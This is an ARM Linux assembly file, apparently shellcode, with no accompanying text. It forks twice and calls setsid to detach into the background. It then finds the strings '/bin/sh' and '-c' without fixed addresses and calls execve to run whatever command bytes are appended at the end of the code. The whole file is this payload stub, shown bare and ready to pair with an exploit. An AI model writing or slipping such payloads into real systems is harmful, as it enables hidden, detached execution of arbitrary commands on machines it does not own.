#include <sys/syscall.h>

#define BINSH "/bin/sh\x00\x00\x00\x00"
#define TACC "-c\x00\x00\x00\x00\x00"

.globl main
.type main, %function

main:
    mov r7, #SYS_fork
    svc #0
    cmp r0, #0
    beq setsid
    mov r0, #0
    mov r7, #SYS_exit
    svc #0

setsid:
    mov r7, #SYS_setsid
    svc #0
    mov r7, #SYS_fork
    svc #0
    cmp r0, #0
    beq forkexit
    mov r0, #0
    mov r7, #SYS_exit
    svc #0

forkexit:
    b get_binsh

ret1:
    mov r0, lr
    b get_tacc

ret2:
    mov r3, lr
    b get_userinput

ret3:
    mov r4, lr

binsh:
    mov r2, #0
    push {r2}
    push {r4}
    push {r3}
    push {r0}
    mov r1, sp
    mov r7, #SYS_execve
    svc #0

exit:
    mov r0, #0
    mov r7, #SYS_exit
    svc #0

get_binsh:
    bl ret1
    .string BINSH

get_tacc:
    bl ret2
    .string TACC

get_userinput:
    bl ret3

user_input:
